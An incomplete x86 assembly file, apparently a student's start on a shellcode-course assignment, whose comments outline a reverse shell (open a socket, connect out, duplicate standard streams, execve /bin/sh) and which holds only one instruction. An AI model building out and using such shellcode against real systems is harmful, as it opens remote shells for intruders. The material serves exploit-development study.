;
; SLAE assignment 2
;

;
; Should: 
; 1. create a socket
; 2. send connection
; 3. dup2 STDIN,ERR,OUT
; 4. execve /bin/sh
;

global _start:

section .text

_start:

	xor eax, eax


	; prepare socket calls


